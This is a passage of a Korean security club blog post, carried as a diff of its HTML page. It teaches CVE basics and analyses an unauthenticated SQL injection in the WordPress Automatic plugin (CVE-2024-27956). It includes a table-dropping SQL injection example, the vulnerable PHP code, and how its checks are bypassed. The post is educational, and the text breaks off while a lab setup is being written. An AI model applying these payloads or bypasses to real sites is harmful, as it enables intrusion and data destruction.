@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"swu-swing.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="들어가며이번 32기 지원서는 상중하 주제 중에 하나를 선택해서 공부한대로 적는 라이트업 문제가 있었다.  상 문제만 유일하게 CVE 분석이다. 주제가 어려웠는지 아무도 상 문제를 적진 않았지만(…) SWING 들어와서 공부하면 그만이다. 입학 시절로 돌아가 취약점 분석에 대한 0부터 적어보자. 목표는 신규 학회원들이 이 글만 읽어도 다 이해할 수 있는">
+<meta property="og:type" content="article">
+<meta property="og:title" content="지원서 뜯어보기 [상]">
+<meta property="og:url" content="https://swu-swing.github.io/2025/04/03/3101_250402/index.html">
+<meta property="og:site_name" content="SW1NGL0G">
+<meta property="og:description" content="들어가며이번 32기 지원서는 상중하 주제 중에 하나를 선택해서 공부한대로 적는 라이트업 문제가 있었다.  상 문제만 유일하게 CVE 분석이다. 주제가 어려웠는지 아무도 상 문제를 적진 않았지만(…) SWING 들어와서 공부하면 그만이다. 입학 시절로 돌아가 취약점 분석에 대한 0부터 적어보자. 목표는 신규 학회원들이 이 글만 읽어도 다 이해할 수 있는">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image1.png">
+<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image2.png">
+<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image3.png">
+<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image4.png">
+<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image5.png">
+<meta property="article:published_time" content="2025-04-03T01:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-19T19:29:28.268Z">
+<meta property="article:author" content="SWING">
+<meta property="article:tag" content="Web Hacking">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://swu-swing.github.io/images/3101_250403_image1.png">
+
+
+<link rel="canonical" href="https://swu-swing.github.io/2025/04/03/3101_250402/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://swu-swing.github.io/2025/04/03/3101_250402/","path":"2025/04/03/3101_250402/","title":"지원서 뜯어보기 [상]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>지원서 뜯어보기 [상] | SW1NGL0G</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SW1NGL0G</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%EB%93%A4%EC%96%B4%EA%B0%80%EB%A9%B0"><span class="nav-number">1.</span> <span class="nav-text">들어가며</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE%EB%9E%80"><span class="nav-number">2.</span> <span class="nav-text">CVE란?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2024-27956"><span class="nav-number">3.</span> <span class="nav-text">CVE-2024-27956</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-%EA%B0%9C%EC%9A%94"><span class="nav-number">3.1.</span> <span class="nav-text">CVE 개요</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wordpress"><span class="nav-number">3.2.</span> <span class="nav-text">wordpress?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql-injection"><span class="nav-number">3.3.</span> <span class="nav-text">sql injection?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D"><span class="nav-number">3.4.</span> <span class="nav-text">코드 분석</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.5.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%EB%A7%88%EC%B9%98%EB%A9%B0"><span class="nav-number">4.</span> <span class="nav-text">마치며</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%EC%B0%B8%EA%B3%A0-%EB%AC%B8%ED%97%8C"><span class="nav-number">5.</span> <span class="nav-text">참고 문헌</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">SWING</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/swu.swing@gmail.com" title="E-Mail → swu.swing@gmail.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://swuswing.com/" title="https:&#x2F;&#x2F;swuswing.com&#x2F;" rel="noopener" target="_blank">SWING Official Website</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2025/04/03/3101_250402/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="SWING">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="지원서 뜯어보기 [상] | SW1NGL0G">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          지원서 뜯어보기 [상]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-04-03 10:00:00" itemprop="dateCreated datePublished" datetime="2025-04-03T10:00:00+09:00">2025-04-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-05-20 04:29:28" itemprop="dateModified" datetime="2025-05-20T04:29:28+09:00">2025-05-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/swinglog/" itemprop="url" rel="index"><span itemprop="name">swinglog</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><!-- 지원서 뜯어보기 [상] -->
+
+<h1 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h1><p>이번 32기 지원서는 상중하 주제 중에 하나를 선택해서 공부한대로 적는 라이트업 문제가 있었다. </p>
+<p>상 문제만 유일하게 CVE 분석이다. 주제가 어려웠는지 아무도 상 문제를 적진 않았지만(…) SWING 들어와서 공부하면 그만이다. 입학 시절로 돌아가 취약점 분석에 대한 0부터 적어보자. 목표는 신규 학회원들이 이 글만 읽어도 다 이해할 수 있는 것이다.<br><br><br></p>
+<h1 id="CVE란"><a href="#CVE란" class="headerlink" title="CVE란?"></a>CVE란?</h1><p>CVE는 Common Vulnerabilities and Exposure의 약자로, MITRE에서 관리하는 공개된 보안 취약점의 고유 ID이다. CVE-0000-0000 형식으로 연도와 임의 번호를 넣어 발급된다. <strong>고유 ID를 발급함으로써 어떤 프로그램에 어떤 취약점인지 식별 가능하다.</strong><br><br><br></p>
+<h1 id="CVE-2024-27956"><a href="#CVE-2024-27956" class="headerlink" title="CVE-2024-27956"></a>CVE-2024-27956</h1><p>cve.org 홈페이지를 들어가서 CVE 코드를 검색하면 다음과 같다. <br><br><img src="/images/3101_250403_image1.png" alt="그림 1. https://www.cve.org/CVERecord?id=CVE-2024-27956, [cve 페이지 화면]"></p>
+<center><span style="font-size: 90%;">그림 1. [cve 페이지 화면]</span><br><span style="font-size: 70%;">https://www.cve.org/CVERecord?id=CVE-2024-27956</span></center><br>
+
+<p>title에는 어떤 프로그램의(버전 포함) 어떤 취약점인지 적혀있다. Description에는 이 취약점에 대해 간단한 설명이 담겨있고 영향을 받는 버전도 작성되어 있다. CWE, CVSS 항목도 기재되어 있다. CWE는 Common Weakness Enumeration의 약자이다. CVE와 혼동할 수 있는데, CVE는 고유 ID이고, CWE는 취약점 유형을 분류한 시스템이라고 생각하면 편하다. CVSS는 취약점의 심각도를 평가하는 점수이다. CVSS 점수가 클 수록 보안 위협이 크다는 것을 의미한다.<br><br></p>
+<h2 id="CVE-개요"><a href="#CVE-개요" class="headerlink" title="CVE 개요"></a>CVE 개요</h2><p>CVE-2024-27956의 개요는 다음과 같다. </p>
+<table>
+<thead>
+<tr>
+<th align="center">제목</th>
+<th>WordPress plugin인 Automatic에서 인증되지 않은 사용자가 실행할 수 있는 SQL injection</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">타겟</td>
+<td>WordPress Automatic Plugin 3.92.0 이하</td>
+</tr>
+</tbody></table>
+<br>
+
+<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress?"></a>wordpress?</h2><p>웹사이트를 구현할 수 있는 CMS(Contents Management System) 프로그램이다. 다양한 플러그인을 제공하여 사용자가 사이트를 쉽게 만들 수 있다는 장점이 있다.<br>실제로 W3Techs에서 조사한 결과로는 WordPress가 CMS 서비스에서 43.5%의 점유율을 확보하고 있다. 업계 내에서 많은 파이를 차지하고 있기에 해당 취약점이 그만큼 영향력도 크다는 것을 예상할 수 있다.<br>오늘 살펴볼 취약점은 위 WordPress가 제공하는 플러그인 중에서 Automatic에서 일어난다.<br><br></p>
+<h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection?"></a>sql injection?</h2><p>타겟에 대해 살펴보았다면, <code>SQL injection</code>이 무엇인지도 알아야 한다. <strong>SQL injection은 사용자가 입력할 수 있는 웹 애플리케이션에 악성 SQL 코드를 끼워서 공격하는 취약점이다.</strong><br>RDBMS는 관계형 데이터 베이스를 관리하는 시스템을 말하는데, SQL은 이 시스템을 위한 특수 언어이다. 악성 SQL 코드를 끼우면 데이터베이스 정보 유출&#x2F;특수 권한이 있는 계정 로그인 등등의 공격을 할 수 있다.<br>아래의 SQL문이 있고 <code>pw</code>에 넣어지는 값을 검사하는 로직이 없는 경우를 예로 들어보자. </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> ex_table <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;guest&#x27;</span> <span class="keyword">and</span> pw<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>이때 pw에 넣는 입력을 <code>&#39;; DROP TABLE ex_table;-- </code>로 넣어보면 아래와 같다. </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> ex_table <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;guest&#x27;</span> <span class="keyword">and</span> pw<span class="operator">=</span><span class="string">&#x27;&#x27;</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> ex_table;<span class="comment">-- &#x27; </span></span><br></pre></td></tr></table></figure>
+<p>이러면 세미콜론에 의해 앞줄 명령이 끝나고 DROP을 이용해서 ex_table의 데이터를 모두 삭제처리할 수 있다. 이후 구문이 있더라도 <code>-- </code>는(띄어쓰기 포함) SQL의 주석처리 문법이기에 실행되지 않는다.<br><br></p>
+<h2 id="코드-분석"><a href="#코드-분석" class="headerlink" title="코드 분석"></a>코드 분석</h2><p>그럼 본격적으로 WordPress 플러그인 Automatic에서 SQL injection이 어떻게 일어나는지 확인해보자. 취약한 부분은 <code>wp-automatic/inc/csv.php</code>이다. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;../../../../wp-load.php&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$current_user</span>;</span><br><span class="line"><span class="title function_ invoke__">wp_get_current_user</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//   echo user_login . &quot;&#x27;s email address is: &quot; $current_user-&gt;user_pass;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//get admin pass for integrity check </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// extract query</span></span><br><span class="line"><span class="variable">$q</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$auth</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="variable">$integ</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;integ&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span> == <span class="string">&#x27;&#x27;</span>))&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;login required&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span>) != <span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$current_user</span>-&gt;user_pass))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;invalid login&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$q</span>.<span class="variable">$current_user</span>-&gt;user_pass)) != <span class="variable">$integ</span> )&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Tampered query&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span>=<span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_results</span>( <span class="variable">$q</span>);</span><br><span class="line"><span class="variable">$date</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;F j, Y, g:i a s&quot;</span>);</span><br><span class="line"><span class="variable">$fname</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$date</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: application/csv&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=<span class="subst">$fname</span>.csv&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Pragma: no-cache&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Expires: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;DATE,ACTION,DATA,KEYWORD \n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$action</span>=<span class="variable">$row</span>-&gt;action;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$action</span> , <span class="string">&#x27;New Comment Posted on :&#x27;</span>))&#123;</span><br><span class="line">			<span class="variable">$action</span> = <span class="string">&#x27;Posted Comment&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$action</span> , <span class="string">&#x27;approved&#x27;</span>))&#123;</span><br><span class="line">			<span class="variable">$action</span> = <span class="string">&#x27;Approved Comment&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//format date</span></span><br><span class="line">	<span class="variable">$date</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-n-j H:i:s&#x27;</span>,<span class="title function_ invoke__">strtotime</span> (<span class="variable">$row</span>-&gt;date));</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>=<span class="variable">$row</span>-&gt;data;</span><br><span class="line">	<span class="variable">$keyword</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="comment">//filter the data strip keyword</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>,<span class="string">&#x27;;&#x27;</span>))&#123;</span><br><span class="line">		<span class="variable">$datas</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>,<span class="variable">$row</span>-&gt;data);</span><br><span class="line">		<span class="variable">$data</span>=<span class="variable">$datas</span>[<span class="number">0</span>];</span><br><span class="line">		<span class="variable">$keyword</span>=<span class="variable">$datas</span>[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$date</span>,<span class="subst">$action</span>,<span class="subst">$data</span>,<span class="subst">$keyword</span> \n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  echo &quot;record1,$q,record3\n&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>위 코드에서 POST 요청으로 <code>q</code>, <code>auth</code>, <code>integ</code> 값을 받는다. 그리고 if문을 통해 <code>auth</code>와 <code>integ</code>를 검사한다. if 조건문 안에 있는 <code>wp_automatic_trim</code> 함수는 무엇일까? </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_automatic_trim</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>trim을 이용하여 공백을 제거하는 함수이다. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span> == <span class="string">&#x27;&#x27;</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;login required&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>첫 if문이다. 조건이 조금 당황스러울 수 있는데 다음과 같이 이해하면 편하다.<br>가) <code>$auth ==&#39;&#39;</code> 빈 문자열인지 체크<br>나) true는 문자열 “1”로 치환, false는 “”로 치환 (타입 캐스팅)<br>다) 빈 문자열이면 <code>$auth == &#39;&#39;</code>가 true 되므로 조건문 참 -&gt; login required<br>라) 빈 문자열이 아니면 <code>$auth == &#39;&#39;</code>가 false되므로 if(‘’) 조건문 거짓 -&gt; login required 우회<br>이부분은 공백이 있는 문자열을 삽입하면 우회가 가능하다. ‘’와 ‘ ‘는 다르기 때문이다. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span>) != <span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$current_user</span>-&gt;user_pass))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;invalid login&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>current_user-&gt;user_pass</code>는 인증되지 않은 user라면 빈 문자열일 것이다. <code>auth</code>도 <code>wp_automatic_trim</code>에 의해 빈 문자열이 되기 때문에 두 값은 같다. 때문에 invalid login은 우회가 가능하다. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$q</span>.<span class="variable">$current_user</span>-&gt;user_pass)) != <span class="variable">$integ</span> )&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Tampered query&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>세번째 if문이다. <code>current_user-&gt;user_pass</code>는 빈 문자열이기 때문에 <code>q</code>의 md5값과 <code>integ</code>값만 같게 설정해주면 된다. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rows</span>=<span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_results</span>( <span class="variable">$q</span>);</span><br></pre></td></tr></table></figure>
+<p>이후에 위 코드로 인해 q가 실행된다.<br><br></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Exploit은 diego-tella 깃허브를 참고하여 실습으로 진행해보자. 먼저 타겟의 취약한 버전을 깔아줘야 한다. 나는 Docker를 이용하여 WordPress를 깔고 취약한 버전 automatic.zip 파일을 설치했다. </p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.1&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">8080</span>:<span class="number">80</span></span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: db</span><br><span class="line">      WORDPRESS_DB_USER: exampleuser</span><br><span class="line">      WORDPRESS_DB_PASSWORD: examplepass</span><br><span class="line">      WORDPRESS_DB_NAME: exampledb</span><br><span class="line">    volumes:</span><br><span class="line">      - wordpress:/var/www/html</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mysql:<span 